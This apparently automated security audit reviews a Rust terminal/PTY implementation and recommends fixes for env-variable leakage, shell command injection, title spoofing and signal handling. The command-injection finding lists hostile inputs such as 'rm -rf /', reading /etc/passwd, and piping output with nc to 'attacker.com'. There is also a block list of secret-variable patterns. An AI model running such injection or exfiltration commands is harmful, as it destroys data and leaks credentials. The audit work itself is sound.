# Security Audit: Terminal/PTY Implementation

**Audit Date:** 2025-12-29  
**Auditor:** terminal-pty-auditor (automated)  
**Scope:** `src/terminal/pty.rs`, `src/terminal/alacritty.rs`, `src/terminal/mod.rs`, `src/terminal/theme_adapter.rs`  
**Risk Rating:** MEDIUM (with HIGH-risk specific findings)

---

## 1. Executive Summary

The terminal implementation in Script Kit GPUI uses `portable-pty` for PTY management and `alacritty_terminal` for terminal emulation. This audit identifies several security considerations related to PTY spawning, escape sequence processing, environment variable handling, and process isolation.

### Key Findings Overview

| ID | Severity | Category | Finding |
|----|----------|----------|---------|
| PTY-001 | HIGH | Environment Leakage | Environment variables (HOME, USER, PATH, SHELL) are inherited without filtering |
| PTY-002 | MEDIUM | Command Injection | Commands passed to `with_command()` are sent directly to interactive shell |
| PTY-003 | LOW | Signal Handling | SIGKILL used for cleanup; no graceful SIGTERM fallback |
| PTY-004 | INFO | Process Isolation | PTY processes run with same privileges as parent |
| ESC-001 | MEDIUM | Escape Sequence | Terminal title changes could be used for UI spoofing |
| ESC-002 | LOW | Clipboard Access | Clipboard store/load events are received but not blocked |
| THR-001 | LOW | Thread Safety | Mutex unwrap in EventProxy could panic on poisoned lock |

---

## 2. Architecture Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                     Script Kit GPUI                              │
├─────────────────────────────────────────────────────────────────┤
│  TerminalHandle                                                  │
│  ├── Arc<Mutex<TerminalState>>  (VTE Parser + Term Grid)        │
│  ├── PtyManager (portable-pty)                                  │
│  ├── ThemeAdapter (color mapping)                               │
│  └── Background Reader Thread (PTY I/O)                         │
├─────────────────────────────────────────────────────────────────┤
│  Data Flow:                                                      │
│  PTY Output → Background Thread → Channel → VTE Parser → Grid   │
│  User Input → TerminalHandle.input() → PTY Writer → Child       │
└─────────────────────────────────────────────────────────────────┘
```

### Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| `portable-pty` | 0.8 | Cross-platform PTY spawning |
| `alacritty_terminal` | 0.25 | Terminal emulation (grid, parsing) |
| `vte` | 0.15 | ANSI escape sequence parser |

---

## 3. Detailed Findings

### PTY-001: Environment Variable Inheritance (HIGH)

**Location:** `src/terminal/pty.rs:183-202`

**Description:** The PTY spawn process inherits sensitive environment variables without filtering:

```rust
#[cfg(unix)]
{
    command.env("TERM", "xterm-256color");
    command.env("COLORTERM", "truecolor");
    command.env("CLICOLOR_FORCE", "1");
    if let Ok(home) = std::env::var("HOME") {
        command.env("HOME", home);  // Inherited
    }
    if let Ok(user) = std::env::var("USER") {
        command.env("USER", user);  // Inherited
    }
    if let Ok(path) = std::env::var("PATH") {
        command.env("PATH", path);  // Full PATH inherited
    }
    if let Ok(shell) = std::env::var("SHELL") {
        command.env("SHELL", shell);  // Inherited
    }
}
```

**Risk:** If the parent process has sensitive environment variables (API keys, secrets, credentials), these could be accessible to scripts running in the terminal.

**Recommendation:**
1. Create an allowlist of safe environment variables to inherit
2. Explicitly exclude known sensitive patterns: `*_KEY`, `*_SECRET`, `*_TOKEN`, `*_PASSWORD`, `AWS_*`, `GITHUB_*`
3. Consider a configuration option to control environment inheritance

**Example fix:**
```rust
const SAFE_ENV_VARS: &[&str] = &[
    "HOME", "USER", "SHELL", "PATH", "TERM", "LANG", "LC_ALL",
    "COLORTERM", "CLICOLOR_FORCE", "TMPDIR", "XDG_RUNTIME_DIR"
];

const BLOCKED_PATTERNS: &[&str] = &[
    "_KEY", "_SECRET", "_TOKEN", "_PASSWORD", "_CREDENTIAL",
    "AWS_", "GITHUB_", "NPM_TOKEN", "DOCKER_"
];

fn is_safe_env_var(key: &str) -> bool {
    if SAFE_ENV_VARS.contains(&key) {
        return true;
    }
    for pattern in BLOCKED_PATTERNS {
        if key.contains(pattern) || key.starts_with(pattern) {
            return false;
        }
    }
    false
}
```

---

### PTY-002: Command Injection via Interactive Shell (MEDIUM)

**Location:** `src/terminal/alacritty.rs:516-528`

**Description:** When a command is provided to `with_command()`, it's sent directly to an interactive shell without escaping:

```rust
if let Some(cmd) = cmd {
    info!(cmd = %cmd, "Sending initial command to interactive shell");
    // Send command followed by newline to execute it
    let cmd_with_newline = format!("{}\n", cmd);
    if let Err(e) = handle.input(cmd_with_newline.as_bytes()) {
        warn!(error = %e, cmd = %cmd, "Failed to send initial command to terminal");
    }
}
```

**Risk:** If the command string comes from untrusted input, shell metacharacters could enable command injection:
- `; rm -rf /` - command chaining
- `$(whoami)` - command substitution
- `` `id` `` - backtick execution
- `| nc attacker.com 1234` - pipe to exfiltration

**Attack Scenario:**
```typescript
// If SDK allows user-controlled command:
await term(userInput);  // userInput = "echo hello; cat /etc/passwd"
```

**Recommendation:**
1. Document that `with_command()` accepts shell commands (not raw executables)
2. If commands should be literal, use direct exec without shell wrapper
3. For user-controlled input, provide an API that takes (command, args[]) separately
4. Consider shell-escaping functions for user input

---

### PTY-003: Signal Handling - No Graceful Shutdown (LOW)

**Location:** `src/terminal/pty.rs:431-437, 448-458`

**Description:** Process cleanup uses SIGKILL immediately without trying SIGTERM first:

```rust
pub fn kill(&mut self) -> Result<()> {
    info!("Killing child process");
    self.child.kill().context("Failed to kill child process")?;  // SIGKILL
    info!("Child process killed");
    Ok(())
}

impl Drop for PtyManager {
    fn drop(&mut self) {
        if self.is_running() {
            if let Err(e) = self.kill() {  // Immediate SIGKILL
                error!(error = %e, "Failed to kill child process during cleanup");
            }
        }
    }
}
```

**Risk:** 
- Child processes don't get a chance to clean up (temp files, sockets, locks)
- Could leave system in inconsistent state
- No signal propagation to process groups (orphaned grandchildren)

**Recommendation:**
```rust
pub fn terminate(&mut self) -> Result<()> {
    #[cfg(unix)]
    {
        use nix::sys::signal::{kill, Signal};
        use nix::unistd::Pid;
        
        // Try SIGTERM first
        if let Some(pid) = self.get_pid() {
            let _ = kill(Pid::from_raw(pid), Signal::SIGTERM);
            // Wait briefly for graceful exit
            std::thread::sleep(Duration::from_millis(100));
            if self.is_running() {
                // Fall back to SIGKILL
                self.child.kill()?;
            }
        }
    }
    Ok(())
}
```

---

### PTY-004: Process Isolation (INFO)

**Location:** `src/terminal/pty.rs` (general architecture)

**Description:** PTY processes run with the same user privileges as the Script Kit application. There is no sandboxing, containerization, or privilege separation.

**Current State:**
- Same UID/GID as parent
- Same filesystem access
- Same network access
- No seccomp/landlock/AppArmor restrictions

**Risk:** If a malicious script runs in the terminal, it has full access to anything the user has access to.

**Recommendation for future hardening:**
1. Consider sandboxing for untrusted scripts (macOS sandbox-exec, Linux seccomp)
2. Document that terminal sessions have full user privileges
3. Consider optional chroot/jail for specific use cases
4. Explore using separate user for PTY processes

---

### ESC-001: Terminal Title Spoofing (MEDIUM)

**Location:** `src/terminal/alacritty.rs:111-118`

**Description:** Terminal title changes from escape sequences are propagated to the UI:

```rust
AlacrittyEvent::Title(title) => {
    debug!(title = %title, "Terminal title changed");
    Some(TerminalEvent::Title(title))
}
AlacrittyEvent::ResetTitle => {
    debug!("Terminal title reset");
    Some(TerminalEvent::Title(String::new()))
}
```

**Risk:** A malicious script could set the terminal title to misleading values:
- Impersonate system dialogs: `\e]0;Password required\a`
- Social engineering: `\e]0;Installation complete! Press Enter\a`
- Hide malicious activity: `\e]0;Compiling...\a` while exfiltrating data

**Recommendation:**
1. Sanitize title strings (remove control characters, limit length)
2. Consider prefixing titles to indicate source: `[Terminal] <title>`
3. Option to disable title changes from terminal content

```rust
fn sanitize_title(title: &str) -> String {
    const MAX_TITLE_LEN: usize = 256;
    title
        .chars()
        .filter(|c| !c.is_control())
        .take(MAX_TITLE_LEN)
        .collect()
}
```

---

### ESC-002: Clipboard Access Events (LOW)

**Location:** `src/terminal/alacritty.rs:145-152`

**Description:** Clipboard events are received but silently ignored:

```rust
AlacrittyEvent::ClipboardStore(_, _) => {
    trace!("Clipboard store request");
    None
}
AlacrittyEvent::ClipboardLoad(_, _) => {
    trace!("Clipboard load request");
    None
}
```

**Current State:** Safe - events are not acted upon.

**Risk:** If clipboard functionality were implemented, escape sequences like OSC 52 could:
- Read clipboard contents without user consent
- Set clipboard to malicious content (paste-jacking)

**Recommendation:**
1. Keep clipboard events disabled (current state)
2. If ever implemented, require explicit user permission
3. Add comment explaining security rationale for ignoring

```rust
// SECURITY: Clipboard events are intentionally ignored.
// OSC 52 escape sequences can read/write clipboard, which is a
// security risk without explicit user consent.
AlacrittyEvent::ClipboardStore(_, _) | AlacrittyEvent::ClipboardLoad(_, _) => {
    // Intentionally ignored for security reasons
    None
}
```

---

### THR-001: Mutex Unwrap on Poisoned Lock (LOW)

**Location:** `src/terminal/alacritty.rs:92-95, 163-165, 567-568, 619, 656, 705-706, 715-716, 728, 733-734, 745-746`

**Description:** Multiple locations use `.unwrap()` on mutex locks:

```rust
let mut events = self.events.lock().unwrap();
// ...
let mut state = self.state.lock().unwrap();
```

**Risk:** If any code panics while holding the lock, subsequent lock attempts will panic (poisoned mutex), potentially crashing the application.

**Recommendation:** Use `.lock().expect("descriptive message")` or handle poisoned locks:

```rust
// Option 1: Explicit expect
let mut state = self.state.lock()
    .expect("Terminal state lock poisoned - internal error");

// Option 2: Recover from poison
let mut state = self.state.lock()
    .unwrap_or_else(|poisoned| poisoned.into_inner());
```

---

## 4. Escape Sequence Attack Surface Analysis

### Supported Escape Sequences

The implementation uses `alacritty_terminal` and `vte` for escape sequence parsing. These support a wide range of sequences:

| Category | Sequences | Security Relevance |
|----------|-----------|-------------------|
| Cursor Movement | CSI A/B/C/D/H/f | Low - display only |
| Text Styling | CSI m (SGR) | Low - cosmetic |
| Screen Control | CSI J/K/L/M | Low - display only |
| Scrolling | CSI S/T | Low - display only |
| Window Ops | CSI t | **Medium** - can report window state |
| Title Setting | OSC 0/1/2 | **Medium** - UI spoofing |
| Clipboard | OSC 52 | **High** - but currently disabled |
| Hyperlinks | OSC 8 | **Medium** - if URLs auto-open |
| Colors | OSC 4/10/11 | Low - theme queries |

### Attack Vectors Not Currently Exploitable

1. **Clipboard (OSC 52):** Events received but not acted upon
2. **Desktop Notifications (OSC 9):** Not implemented
3. **Sixel/iTerm2 Graphics:** Not implemented
4. **Arbitrary File Read (OSC 1337):** Not implemented

### Potential Future Concerns

If features are added:
- **Hyperlink handling:** URL validation required before opening
- **Image display:** Path traversal, symlink attacks
- **Desktop notifications:** Spam, phishing potential

---

## 5. Process Isolation Analysis

### Current Isolation Boundaries

```
┌─────────────────────────────────────────────────────────┐
│                    Same Process Space                    │
├─────────────────────────────────────────────────────────┤
│  Script Kit GPUI (main process)                         │
│       │                                                 │
│       └── PTY Child Process (same user, same caps)     │
│              │                                          │
│              └── Shell (zsh/bash/sh)                   │
│                     │                                   │
│                     └── User Command                   │
└─────────────────────────────────────────────────────────┘

Shared Resources:
- User home directory (full access)
- Network (unrestricted)
- Filesystem (user-level access)
- Environment variables (filtered but not sandboxed)
```

### Comparison with Security Best Practices

| Practice | Status | Notes |
|----------|--------|-------|
| Least Privilege | NOT IMPLEMENTED | Same user as parent |
| Process Sandboxing | NOT IMPLEMENTED | No seccomp/landlock |
| Network Isolation | NOT IMPLEMENTED | Full network access |
| Filesystem Isolation | NOT IMPLEMENTED | Full user filesystem |
| Capability Dropping | NOT IMPLEMENTED | All caps inherited |
| Resource Limits | NOT IMPLEMENTED | No cgroups/ulimits |

---

## 6. Signal Handling Analysis

### Current Implementation

| Signal | Handling | Notes |
|--------|----------|-------|
| SIGWINCH | Via `resize()` | Properly forwarded to PTY |
| SIGKILL | `kill()` method | Used for cleanup |
| SIGTERM | Not implemented | Should be tried before SIGKILL |
| SIGINT | Not handled | Ctrl+C goes to child via PTY |
| SIGHUP | Not handled | Could orphan child processes |

### Process Group Handling

**Issue:** No explicit process group management.

```rust
// Current: Just spawns the process
let child = pair.slave.spawn_command(command)?;

// Recommended: Create new process group
// This allows sending signals to entire process tree
```

**Risk:** If the terminal spawns subprocesses, killing only the immediate child may leave grandchildren running (zombie processes).

---

## 7. Recommendations Summary

### High Priority

1. **PTY-001:** Implement environment variable filtering
   - Create allowlist of safe variables
   - Block known sensitive patterns
   - Configuration option for power users

2. **PTY-002:** Document shell command execution risks
   - Clearly document that commands run through shell
   - Provide escaped-execution API for programmatic use

### Medium Priority

3. **ESC-001:** Sanitize terminal title strings
   - Remove control characters
   - Limit length
   - Consider prefixing

4. **PTY-003:** Implement graceful shutdown
   - SIGTERM before SIGKILL
   - Brief wait period for cleanup

### Low Priority / Future

5. **PTY-004:** Consider sandboxing options for untrusted scripts
6. **THR-001:** Replace `.unwrap()` with explicit error handling
7. **ESC-002:** Add security comments for disabled features

---

## 8. Testing Recommendations

### Security Test Cases

```rust
#[test]
fn test_env_filtering() {
    std::env::set_var("SENSITIVE_API_KEY", "secret123");
    let pty = PtyManager::new()?;
    // Verify SENSITIVE_API_KEY is not in child environment
}

#[test]
fn test_title_sanitization() {
    let malicious = "\x1b]0;Fake System Dialog\x07";
    let sanitized = sanitize_title(malicious);
    assert!(!sanitized.contains('\x1b'));
    assert!(!sanitized.contains('\x07'));
}

#[test]
fn test_command_with_shell_metacharacters() {
    // Document expected behavior
    let result = TerminalHandle::with_command("echo hello; echo world", 80, 24);
    // Both commands execute (this is expected - document it)
}
```

### Fuzzing Targets

1. VTE parser with malformed escape sequences
2. Terminal title with various Unicode/control characters
3. Large output buffers (memory exhaustion)
4. Rapid resize events (race conditions)

---

## 9. Compliance Notes

### Relevant Security Standards

| Standard | Relevance | Status |
|----------|-----------|--------|
| OWASP | Command Injection (A03:2021) | Partial concern - documented |
| CWE-78 | OS Command Injection | Low risk - intentional shell access |
| CWE-200 | Information Exposure | Medium - env var leakage |

### Documentation Requirements

The following should be documented for users:
1. Terminal sessions have full user privileges
2. Environment variables may be inherited
3. Commands are executed through shell interpreter
4. Escape sequences can modify terminal appearance

---

## 10. Appendix: Code Locations Reference

| File | Lines | Component |
|------|-------|-----------|
| `src/terminal/pty.rs` | 1-609 | PTY management |
| `src/terminal/alacritty.rs` | 1-1315 | Terminal emulation |
| `src/terminal/mod.rs` | 1-146 | Module exports, events |
| `src/terminal/theme_adapter.rs` | 1-800 | Color adaptation |

### Critical Functions

| Function | File | Line | Security Relevance |
|----------|------|------|-------------------|
| `spawn_internal` | pty.rs | 156 | Process spawning |
| `detect_shell` | pty.rs | 242 | Shell selection |
| `create_internal` | alacritty.rs | 427 | Terminal creation |
| `process` | alacritty.rs | 563 | Escape sequence processing |
| `input` | alacritty.rs | 585 | User input to PTY |
| `send_event` | alacritty.rs | 105 | Event handling |

---

**Audit Complete**

This audit identified medium-severity concerns primarily around environment variable handling and command execution semantics. The implementation follows reasonable security practices for a developer-focused tool, but should document the security model clearly for users and consider additional hardening for untrusted input scenarios.
